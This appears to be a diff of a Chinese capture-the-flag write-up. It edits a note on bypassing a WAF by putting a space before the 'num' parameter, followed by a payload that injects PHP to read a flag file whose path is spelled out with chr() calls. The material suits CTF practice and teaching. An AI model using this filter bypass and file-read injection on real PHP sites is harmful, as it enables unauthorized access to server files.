@@ -51,14 +51,12 @@ icon: icon-html
   ?> 
   ```
 
-  传入字母出Forbidden，num前加空格，waf不会过滤这个空格num，但是php识别空格num和num是一样的
-
-  然后白给
+  传入字母出Forbidden，num前加空格绕waf
 
   ```
-  calc.php?%20num=ls;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
+calc.php?%20num=ls;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
   ```
-
+  
 * ### RSA
 
   ```python
